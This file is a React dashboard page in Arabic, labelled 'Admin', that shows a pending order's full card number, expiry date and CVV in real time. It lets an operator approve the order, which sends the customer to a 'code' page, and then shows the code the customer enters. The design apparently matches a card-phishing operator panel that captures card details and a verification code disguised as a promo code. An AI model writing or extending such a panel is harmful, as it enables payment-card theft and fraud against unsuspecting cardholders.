"use client"
import { useState, useEffect } from "react"
import { CheckCircle2, Clock, CreditCard, Tag } from "lucide-react"

interface Order {
  id: string
  status: "pending" | "approved"
  cardNumber: string
  expiry: string
  cvv: string
  total: number
  promoCode: string | null
  createdAt: string
}

export default function DashboardPage() {
  const [order, setOrder] = useState<Order | null>(null)
  const [approved, setApproved] = useState(false)

  // Load and poll localStorage
  useEffect(() => {
    function load() {
      try {
        const raw = localStorage.getItem("alain_order")
        if (raw) {
          const o = JSON.parse(raw) as Order
          setOrder(o)
          setApproved(o.status === "approved")
        }
      } catch {}
    }
    load()
    const interval = setInterval(load, 1500)
    return () => clearInterval(interval)
  }, [])

  function approve() {
    if (!order) return
    const updated = { ...order, status: "approved" as const }
    localStorage.setItem("alain_order", JSON.stringify(updated))
    setOrder(updated)
    setApproved(true)
  }

  function clearOrder() {
    localStorage.removeItem("alain_order")
    setOrder(null)
    setApproved(false)
  }

  return (
    <div className="min-h-screen bg-gray-950 text-white p-6" dir="rtl">
      <div className="max-w-xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-2xl font-black tracking-tight">لوحة التحكم</h1>
          <span className="text-xs bg-gray-800 text-gray-400 px-3 py-1 rounded-full">Admin</span>
        </div>

        {!order ? (
          <div className="bg-gray-900 rounded-2xl p-10 text-center text-gray-500">
            <Clock size={40} className="mx-auto mb-3 opacity-40" />
            <p className="text-sm">لا يوجد طلب معلق حالياً</p>
          </div>
        ) : (
          <div className="space-y-4">

            {/* Status badge */}
            <div className={`flex items-center gap-2 px-4 py-3 rounded-xl text-sm font-bold ${
              approved
                ? "bg-green-900/50 text-green-400 border border-green-800"
                : "bg-amber-900/50 text-amber-400 border border-amber-800"
            }`}>
              <span className={`w-2 h-2 rounded-full ${approved ? "bg-green-400" : "bg-amber-400 animate-pulse"}`} />
              {approved ? "تمت الموافقة — العميل الآن في صفحة الكود" : "طلب معلق — بانتظار الموافقة"}
            </div>

            {/* Card Details */}
            <div className="bg-gray-900 rounded-2xl p-5 space-y-3">
              <div className="flex items-center gap-2 text-gray-400 text-xs font-semibold uppercase tracking-widest mb-1">
                <CreditCard size={14} />
                <span>بيانات البطاقة</span>
              </div>

              <div className="space-y-2">
                <Row label="رقم البطاقة" value={order.cardNumber || "—"} mono />
                <Row label="تاريخ الانتهاء" value={order.expiry || "—"} mono />
                <Row label="CVV" value={order.cvv || "—"} mono />
                <Row label="المبلغ" value={`${order.total?.toFixed(2)} د.إ`} />
                <Row label="وقت الطلب" value={new Date(order.createdAt).toLocaleTimeString("ar-AE")} />
              </div>
            </div>

            {/* Promo Code */}
            <div className="bg-gray-900 rounded-2xl p-5">
              <div className="flex items-center gap-2 text-gray-400 text-xs font-semibold uppercase tracking-widest mb-3">
                <Tag size={14} />
                <span>كود الخصم</span>
              </div>
              {order.promoCode ? (
                <div className="bg-gray-800 rounded-xl px-4 py-3 font-mono text-lg font-black text-yellow-400 tracking-widest">
                  {order.promoCode}
                </div>
              ) : (
                <p className="text-gray-600 text-sm">لم يُدخل العميل كود بعد</p>
              )}
            </div>

            {/* Actions */}
            <div className="flex gap-3">
              {!approved && (
                <button
                  onClick={approve}
                  className="flex-1 flex items-center justify-center gap-2 bg-green-600 hover:bg-green-500 text-white font-black py-3 rounded-xl transition-colors"
                >
                  <CheckCircle2 size={18} />
                  موافقة — إرسال للكود
                </button>
              )}
              <button
                onClick={clearOrder}
                className="px-5 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 text-gray-400 font-semibold text-sm transition-colors"
              >
                مسح
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

function Row({ label, value, mono }: { label: string; value: string; mono?: boolean }) {
  return (
    <div className="flex justify-between items-center">
      <span className="text-gray-500 text-sm">{label}</span>
      <span className={`text-white text-sm font-semibold ${mono ? "font-mono tracking-wider" : ""}`}>{value}</span>
    </div>
  )
}
